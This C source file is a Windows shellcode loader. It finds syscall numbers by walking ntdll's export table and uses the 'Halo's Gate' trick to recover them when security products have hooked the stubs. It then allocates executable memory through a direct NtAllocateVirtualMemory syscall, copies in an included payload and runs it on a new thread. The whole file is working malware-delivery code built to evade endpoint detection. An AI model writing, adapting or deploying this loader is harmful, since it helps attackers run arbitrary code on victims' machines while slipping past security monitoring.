#include <windows.h>
#include <stdio.h>
#include "../common/payload.h"
#include "../common/syscall_stubs.h"

DWORD get_ssn(const char* func_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)ntdll + nt->OptionalHeader.DataDirectory[0].VirtualAddress);
    DWORD *names = (DWORD*)((BYTE*)ntdll + exp->AddressOfNames);
    DWORD *funcs = (DWORD*)((BYTE*)ntdll + exp->AddressOfFunctions);
    WORD *ords = (WORD*)((BYTE*)ntdll + exp->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char*)ntdll + names[i];
        if (strcmp(name, func_name) == 0) {
            BYTE *addr = (BYTE*)ntdll + funcs[ords[i]];
            /* Check standard stub: mov r10, rcx; mov eax, SSN */
            if (addr[0] == 0x4c && addr[1] == 0x8b && addr[2] == 0xd1 && addr[3] == 0xb8) {
                return *((DWORD*)(addr + 4));
            }
            /* Halo's Gate: check neighboring functions if hooked */
            for (int idx = 1; idx <= 32; idx++) {
                BYTE *down = addr + (idx * 32);
                if (down[0] == 0x4c && down[1] == 0x8b && down[2] == 0xd1 && down[3] == 0xb8) {
                    return *((DWORD*)(down + 4)) - idx;
                }
                BYTE *up = addr - (idx * 32);
                if (up[0] == 0x4c && up[1] == 0x8b && up[2] == 0xd1 && up[3] == 0xb8) {
                    return *((DWORD*)(up + 4)) + idx;
                }
            }
        }
    }
    return 0;
}

int main() {
    DWORD ssn_alloc = get_ssn("NtAllocateVirtualMemory");
    PVOID base = NULL;
    SIZE_T region_size = payload_len;
    
    if (ssn_alloc) {
        /* Direct syscall: NtAllocateVirtualMemory(GetCurrentProcess(), &base, 0, &region_size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) */
        NTSTATUS status = sys_direct_call(
            ssn_alloc,
            (PVOID)(LONG_PTR)-1,          /* ProcessHandle = GetCurrentProcess() */
            (PVOID)&base,                 /* BaseAddress */
            (PVOID)0,                     /* ZeroBits */
            (PVOID)&region_size,          /* RegionSize */
            (PVOID)(MEM_COMMIT | MEM_RESERVE), /* AllocationType */
            (PVOID)PAGE_EXECUTE_READWRITE /* Protect */
        );
        if (status != 0 || !base) {
            return 1;
        }
    } else {
        base = VirtualAlloc(0, region_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!base) return 1;
    }

    memcpy(base, payload, payload_len);

    HANDLE th = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)base, NULL, 0, NULL);
    if (th) {
        WaitForSingleObject(th, INFINITE);
        CloseHandle(th);
    }
    return 0;
}
